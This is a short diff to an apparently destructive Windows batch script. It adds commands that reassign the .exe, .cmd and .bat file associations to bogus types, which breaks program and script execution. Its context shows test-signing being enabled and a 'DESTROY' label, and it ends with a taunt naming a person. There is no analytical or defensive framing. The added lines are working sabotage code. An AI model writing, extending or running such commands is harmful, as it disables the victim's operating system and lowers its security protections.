@@ -219,6 +219,9 @@ cls
 goto RESTART
 :BCD
 bcdedit /set TESTSIGNING on
+assoc .exe=jaydumb
+assoc .cmd=windfufBest
+assoc .bat=CmdV4
 goto DESTROY
 
 If you see this Jayden IS Idiotic and DUMB!
